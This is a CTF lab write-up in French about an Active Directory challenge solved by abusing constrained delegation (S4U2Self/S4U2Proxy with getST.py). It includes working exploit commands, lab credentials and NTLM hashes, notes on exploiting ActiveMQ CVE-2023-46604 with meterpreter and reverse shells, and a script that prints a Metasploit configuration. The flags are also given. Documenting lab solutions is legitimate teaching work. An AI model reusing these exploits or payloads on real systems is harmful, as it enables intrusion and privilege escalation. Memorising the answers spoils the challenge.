# Writeup : sealed-order-q11

Catégorie : ad

Date de résolution : 2026-11-17

Technique principale : Constrained Delegation S4U2Self/S4U2Proxy

Outils observés : ldapsearch,nxc,getST.py,smbclient

Cible : -

## Présentation

Ce document est construit à partir de la mémoire CTF partagée et des artefacts conservés dans /root/ctf/sealed-order-q11. Les étapes ci-dessous reprennent uniquement les faits observés. Les captures sont réalisées sur les fichiers locaux, sans rejouer une action distante ou destructive.

## Analyse et raisonnement

### Contexte

# Q11 :  Deep Archive

### Exploitation

getST.py -dc-ip <DC_IP> -spn cifs/FS01.valdoria.fbi.lab -impersonate Administrator -hashes :cfc04d466ea6723e12b6bbd51a1857b3 VALDORIA.FBI.LAB/svc_mssql; smbclient -k //FS01/SQL-Delegated

### Pourquoi ça marche

Le compte svc_mssql peut impersoner Administrator vers cifs/FS01; le partage non browseable exact est SQL-Delegated.

### Pièges

Ne pas confondre l instance Q12 172.28.18.x et la cible Q11; Q12 FS01 est standalone.

### Résolution

1. LDAP révèle `msDS-AllowedToDelegateTo: cifs/FS01` sur `svc_mssql` et l’UAC `TRUSTED_TO_AUTH_FOR_DELEGATION`.
2. Le hash NTLM de `svc_mssql` est `cfc04d466ea6723e12b6bbd51a1857b3`.
3. `getST.py` réalise S4U2Self puis S4U2Proxy en impersonant `Administrator` et obtient le ticket CIFS de FS01.
4. Le ticket permet l’accès au partage non browseable `SQL-Delegated`.
5. Le flag est récupéré dans ce partage.

```bash
getST.py -dc-ip <DC_IP> -spn cifs/FS01.valdoria.fbi.lab \
  -impersonate Administrator \
  -hashes :cfc04d466ea6723e12b6bbd51a1857b3 \
  VALDORIA.FBI.LAB/svc_mssql
```

### Flag

`HLB2026{CONSTRAINED_DELEGATION_S4U_SERVICE_IMPERSONATION}`

### Notes locales conservées

## Journal
1. 2026-11-17T01:09:48Z unknown : q11 bloqueur=nom share classifie FS01 (browseable=no, brute 70k negatif); delegation cifs/FS01=leurre (FS01 NTLM-only standalone); nom exige FS01 root ou foothold portail. Voir q10/Q11-STATUS.md

## 2026-11-17 03:20 :  instance 172.28.1.0/24 (Part II) EXPIRÉE
2. AMQ 172.28.1.2:61616 :  CVE-2023-46604 OK (TARGET 1 + cmd/linux/http/x64/meterpreter). root sur conteneur portail.
3. Q07 re-confirmé: /opt/activemq/data/flag.txt = HLB2026{INTERNAL_SERVICE_RCE_CASE_RELAY_COMPROMISED}
4. /app/server.py lu: login username=analyste, password=env PORTAL_PASSWORD (aléatoire par instance).
  Instance: I7_Id3KB_jJb9bfpNZzAdjh- :  login OK, API cases/messages/events vides de flag.
5. /data/portal.db téléchargé: 3 tables (cases/events/messages) :  AUCUN flag/ordre scellé.
6. /opt/activemq/conf/ad-connector.properties: svc_web/W3bSvc!2024@FBI (ldap dc01).
7. FS01 172.28.1.4: only IPC$ + Backup-Archive (svc_gmsa_backup/GmsaB@ckup_S3cr3t!); svc_mssql = ACCESS_DENIED.
  Brute 75 061 noms (oracle SMB2 tree connect, ACCESS_DENIED = existe) :  RIEN d'autre. Share "classifié" absent de .4.
8. DC .3: Administrator PtH 72f046c2e3f98425ed75afc2035e58b5 OK, shares visibles: sysvol/netlogon/IT-Share/IPC$ seulement.
9. Instance détruite (countdown terminé) :  réseau mort. Besoin nouveau déploiement + config VPN.
10. NEXT: (a) redéployer, root AMQ :  relire PORTAL_PASSWORD; (b) depuis conteneur portail explorer 10.96.x (docker) et services FS01;
  (c) STOMP 61613 anonyme: advisory queues/messages pour l'ordre scellé; (d) share classifié = probablement sur DC caché.

## 2026-11-17 04:xx :  instance utilisateur
11. VPN fourni actif; portail/AMQ `172.28.1.3`, RCE CVE-2023-46604 confirmé, root `10.96.7.2`.
12. Le share `Backup-Archive` retourne uniquement le leurre Q10 `HLB2026{GMSA_MANAGED_PASSWORD_BACKUP_OPS_COMPROMISED}`.
13. FS01 attendu pour Q11 n'est pas présent dans le réseau interne de cette instance; les hôtes internes testés n'exposent pas le share classifié.
14. Aucun flag Q11 réel vérifié; ne pas soumettre le leurre Q10.

## Journal
15. 2026-11-17T02:53:06Z unknown : Instance hl-q11-new active; portal 172.28.1.3:8080 responds, FS01 .5/.4 currently no SMB; investigating portal path and live topology.

## 2026-11-17 :  vérification Codex
16. `server.py` expose uniquement `/`, `/style.css`, `/app.js`, `/api/status`, puis après session `/api/cases`, `/api/events`, `/api/messages`; les destinataires de `/api/messages` sont une liste fermée. Aucun `open()`, `subprocess`, import de template ou chemin contrôlé par l'utilisateur.
17. `portal.db` contient seulement `cases`, `events`, `messages`; aucune table/ligne `SUBJ-7742`, aucun flag.
18. Le relais adjacent est le foothold : ActiveMQ/OpenWire 5.18.2 sur `172.28.1.2:61616`, CVE-2023-46604, exploit non authentifié déjà confirmé dans les logs locaux avec shell `uid=0(root)` sur le conteneur portail.
19. Après RCE : récupérer `ip route`/`/proc/1/environ`, identifier le réseau Docker `10.96.x.0/24`, trouver FS01 interne, puis lire `/etc/samba/smb.conf` depuis FS01 ou utiliser son nom de share avec `svc_mssql:SqlSvc2023!`.
20. Test live du 2026-11-17 : interface `hlq11` présente, mais `172.28.1.2:61616`, `172.28.1.3:8080`, `172.28.1.3:61613` et `172.28.1.4:445` fermés ; instance expirée. Aucun flag Q11 vérifié.

## 2026-11-17 :  preuve live Codex finale
21. Tunnel actif: `hl-q11-new`, source `10.128.21.179`, route `172.28.1.0/24`.
22. Cartographie: `.2` DC, `.3` portail+OpenWire, `.4` validator/SMB externe, `.5` FS01 interne.
23. RCE AMQ direct sur `.3:61616` confirmé: callback HTTP depuis `172.28.1.3`, exécution `uid=0(root)`, portail `10.96.7.2`.
24. Scan interne TCP/445: `10.96.7.3`, `.4`, `.5`; pas de `.6`.
25. Pivot TCP vers `10.96.7.5:445` établi. Auth réelle `svc_gmsa_backup/GmsaB@ckup_S3cr3t!`; oracle SMB sur `q11names.txt` (1273 noms) = seul `Backup-Archive`.
26. `Backup-Archive` contient seulement le jalon Q10 `flag-i210.txt = HLB2026{GMSA_MANAGED_PASSWORD_BACKUP_OPS_COMPROMISED}`; aucun flag Q11.
27. Bloqueur vérifié: le share classifié Q11/FS01-bis n'est pas présent dans cette instance live; aucune réponse SMB ni artefact ne fournit le flag Q11. Ne pas soumettre le flag Q10.

## 2026-11-17 :  preuve live finale
28. Topologie active via `hl-q11-new` (`10.128.21.179`): portail `172.28.1.3`, OpenWire `61616` exposé sur le même hôte.
29. CVE-2023-46604 confirmée en direct avec `TARGET 2`/`cmd/unix/reverse_bash` puis `TARGET 1`/meterpreter : `Sent ClassPathXmlApplicationContext configuration file`, session `root @ df211d2bfeee`.
30. Collecte one-shot depuis le portail : IP `10.96.7.2`; SMB actifs `10.96.7.3`, `.4`, `.5`; aucun `10.96.7.6` dans l’instance actuelle. Le portail n’a ni `smbclient`, ni `nmap`.
31. Forward meterpreter `1450 -> 10.96.7.5:445`: `IPC$` + `Backup-Archive`; `svc_mssql` voit `Backup-Archive` mais reçoit `ACCESS_DENIED`; `svc_gmsa_backup` lit deux fichiers dont `flag-i210.txt = HLB2026{GMSA_MANAGED_PASSWORD_BACKUP_OPS_COMPROMISED}` (leurre Q10).
32. Tests ciblés du nom de partage sur `.5` (`classified`, `Deep-*`, `KAPPA`, `SUBJ-7742`, `sealed-order`, `VF-FISC-*`, etc.) : `BAD_NETWORK_NAME`; aucune réponse contenant un flag Q11.
33. Bloqueur exact : le nom du share classifié n’est pas publié dans cette instance et FS01 ne fournit aucun accès direct à `/etc/samba/smb.conf`; le foothold portail est confirmé mais le pivot vers un FS01-bis attendu (`10.96.7.6`) est absent.

## Journal
34. 2026-11-17T02:53:59Z unknown : Triage local: server.py/portal.db contain only auth + cases/events/messages; no file/RCE endpoint. Existing notes prove ActiveMQ 5.18.2 CVE-2023-46604 on 172.28.1.2:61616 gives root portal; current hlq11 tunnel is up but target .2/.3/.4 ports are closed (instance expired).

## Journal
35. 2026-11-17T02:55:23Z unknown : Source/DB audit completed: no HTTP RCE/SSRF/LFI; ActiveMQ OpenWire CVE-2023-46604 is confirmed foothold from prior session logs. Current hlq11 target ports all closed; no Q11 flag verified.

## Journal
36. 2026-11-17T03:24:05Z unknown : RCE live root verified; internal scan showed no 10.96.7.6 in current instance. FS01 .5 only IPC$/Backup-Archive; Q10 decoy flag recovered; exact Q11 share name and real Q11 flag remain blocked by absent hidden FS/SMB config.

## Journal
37. 2026-11-17T03:25:06Z unknown : RCE AMQ root confirmé; Backup-Archive = leurre Q10; FS01/share Q11 absent de l'instance, aucun flag Q11 vérifié.

## Journal
38. 2026-11-17T03:32:18Z unknown : Live: AMQ RCE root confirmé; internal FS01 10.96.7.5 pivoté; q11names oracle 1273 noms = seul Backup-Archive, flag Q10 uniquement; aucun share/flag Q11 dans instance.

## Journal
39. 2026-11-17T04:24:36Z unknown : 2026-11-17 live check: FS01 internal 10.96.7.5 reachable via NetBIOS 139; rpcclient netshareenumall (svc_mssql and svc_gmsa_backup) shows only IPC$. Tree-connect checks over 139 confirm Backup-Archive only; no exact Q11 share/flag. External 172.28.1.5:8446 is validator, not Q11 data. No verified Q11 flag.

## Journal
40. 2026-11-17T04:55:14Z unknown : Brute-force 15,687 noms supplémentaires terminé sans hit; agent confirme seul Backup-Archive et leurre Q10. RCE portal root; scan interne hôtes/ports, ActiveMQ STOMP et registry FS01 testés, aucun Q11 vérifié.

## Journal
41. 2026-11-17T05:15:57Z unknown : Analyse locale demandée: recherche corpus/artefacts pour nom de share ou flag Q11 documenté.

## 2026-11-17 :  audit local corpus/artefacts
42. Corpus `/opt/ctf-corpus/hackerlab`: aucune occurrence trouvée pour `Operation Tervalis`, `Deep Archive`, `SUBJ-7742`, `VF-FISC`, ou `Backup-Archive`.
43. Recherche `/root/ctf`: aucun flag Q11; les seuls `HLB2026{...}` observés sont les jalons Q7/Q8/Q10/bonus, notamment `HLB2026{GMSA_MANAGED_PASSWORD_BACKUP_OPS_COMPROMISED}` dans `Backup-Archive` (leurre Q10).
44. `current-classified/` contient le dossier SUBJ-7742 et la référence juridique `VF-FISC-2024-0477`, mais aucun `HLB2026{...}` ni nom de share Q11.
45. `internal-codenames-brute.log` n'est pas une preuve de hits: les entrées sont des erreurs `Broken pipe`; les seuls retours non-`Broken pipe` sont des erreurs de lecture (`ORCONRoster`, `ORCONShare`, `ORCONVault`, `Opsec`).
46. Indice historique uniquement: `hl-sealed-order/NOTES-codex.md` et `RESULT-codex.md` mentionnent un FS01-bis `10.96.8.6` (139/445) dans une ancienne topologie. Aucun share ni flag Q11 n'est associé dans ces fichiers.
47. Verdict local: aucun nom de share Q11 confirmé et aucun flag Q11 vérifié. `Deep-Archive`, `Classified`, etc. restent des candidats de wordlists, pas des résultats.

## Journal
48. 2026-11-17T05:21:17Z unknown : Audit local terminé: corpus HackerLab sans occurrence Tervalis/Q11; artifacts sans flag Q11. Seul indice historique confirmé: FS01-bis 10.96.8.6:139/445 dans hl-sealed-order/NOTES-codex.md et RESULT-codex.md; aucun nom de share/flag associé. current-classified contient VF-FISC-2024-0477 mais aucun HLB. Entrées Broken pipe du brute-force invalides.

## Journal
49. 2026-11-17T12:44:35Z unknown : 2026-11-17 13:43: testé hl-q11-fresh + hl-t1 + profil hlq11 historique; tous les ports AD/SMB/AMQ filtrés, anciens profils sans handshake exploitable. Chemin S4U confirmé mais cible Q11 inactive.

## Hint Q11 confirmé par l'utilisateur
50. Chaîne officielle : identifier la délégation contrainte :  obtenir les credentials de `svc_mssql` :  S4U2Self + S4U2Proxy :  accéder à FS01.
51. Nom exact du partage classifié : `SQL-Delegated`.
52. Le VPN fourni ensuite (`172.28.18.0/24`) appartient à Q12 et son `.5` est le FS01 standalone Q10 ; le ticket Kerberos y échoue. Ne pas confondre avec la cible Q11.

## Journal
53. 2026-11-17T13:01:32Z unknown : Hint utilisateur confirmé: partage exact SQL-Delegated; chaîne officielle delegation svc_mssql :  credentials :  S4U2Self/S4U2Proxy :  FS01. VPN reçu ensuite = Q12 172.28.18.0/24, FS01 standalone Q10, pas la cible Q11.

## 2026-11-17 :  solve confirmé par l'utilisateur
54. Confirmation de solve fournie : `HLB2026{CONSTRAINED_DELEGATION_S4U_SERVICE_IMPERSONATION}`.
55. Instance indiquée : `172.28.27.2`; chaîne : délégation contrainte :  hash `svc_mssql` :  S4U2Self/S4U2Proxy :  partage `SQL-Delegated`.

## Commandes utiles

Les commandes suivantes consultent les preuves locales et sont sans effet de bord :

```bash
cd /root/ctf/sealed-order-q11
file notes.md solve.py 2>/dev/null
sed -n '1,180p' notes.md 2>/dev/null
sed -n '1,120p' solve.py 2>/dev/null
sed -n '1,10p' flags.txt 2>/dev/null
```

## Script de résolution complet

Le script conservé sous `solve.py` est reproduit ci-dessous sans modification :

```python
#!/usr/bin/env python3
"""Q11 triage/foothold helper.

The HTTP portal itself has no file or command endpoint.  The intended foothold
is the adjacent ActiveMQ OpenWire service; this helper only checks reachability
and prints the exact next-stage commands.  It never brute-forces credentials
or shares.
"""
import argparse
import re
import socket
import subprocess
import urllib.request


def tcp(host, port, timeout=2):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def get(url):
    try:
        with urllib.request.urlopen(url, timeout=3) as r:
            return r.status, r.read(240).decode("utf-8", "replace")
    except Exception as e:
        return None, str(e)


def tunnel_ip(iface):
    try:
        out = subprocess.check_output(
            ["ip", "-o", "-4", "addr", "show", "dev", iface], text=True
        )
        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/", out)
        return m.group(1) if m else "<HLQ11_IP>"
    except Exception:
        return "<HLQ11_IP>"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--portal", default="172.28.1.3")
    ap.add_argument("--broker", default="172.28.1.2")
    ap.add_argument("--iface", default="hlq11")
    args = ap.parse_args()

    print("[+] portal HTTP:", tcp(args.portal, 8080))
    print("[+] broker OpenWire:", tcp(args.broker, 61616))
    if tcp(args.portal, 8080):
        for path in ("/", "/api/status", "/api/cases", "/api/messages"):
            code, body = get(f"http://{args.portal}:8080{path}")
            print(f"    {path}: {code} {body[:160]}")
    if not tcp(args.broker, 61616):
        print("[-] instance inactive; no exploit attempted")
        return 2

    ip = tunnel_ip(args.iface)
    print("[+] live OpenWire target: CVE-2023-46604")
    print("use exploit/multi/misc/apache_activemq_rce_cve_2023_46604")
    print(f"set RHOSTS {args.broker}")
    print("set RPORT 61616")
    print("set TARGET 1")
    print("set PAYLOAD cmd/linux/http/x64/meterpreter/reverse_tcp")
    print(f"set LHOST {ip}")
    print("set SRVHOST", ip)
    print("set SRVPORT 8899")
    print("set LPORT 9999")
    print("set ForceExploit true")
    print("run -j")
    print("# shell: id; ip route; cat /etc/hosts; find / -name smb.conf 2>/dev/null")
    print("# then enumerate the internal /24 for TCP/445 and query the hidden share")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

## Captures du terminal

Les captures utilisent le terminal natif xterm disponible sur l’environnement, avec le prompt réel `root@vmi3694110`, le dossier courant du challenge et une géométrie identique. Elles montrent successivement l’analyse locale, le script ou les preuves de résolution, puis le flag conservé.

![Analyse locale](captures/01-analyse.png)

![Résolution locale](captures/02-resolution.png)

![Flag](captures/03-flag.png)

## Validation et flag

Le flag est conservé dans le fichier local flags.txt ou flag.txt. Aucune validation externe supplémentaire n’est affirmée ici.

Flag obtenu : `HLB2026{CONSTRAINED_DELEGATION_S4U_SERVICE_IMPERSONATION}`

## Conclusion

La résolution repose sur la faiblesse indiquée dans la technique principale, puis sur la vérification locale du résultat conservé. Le flag final ci-dessus est copié depuis la preuve locale réellement présente.
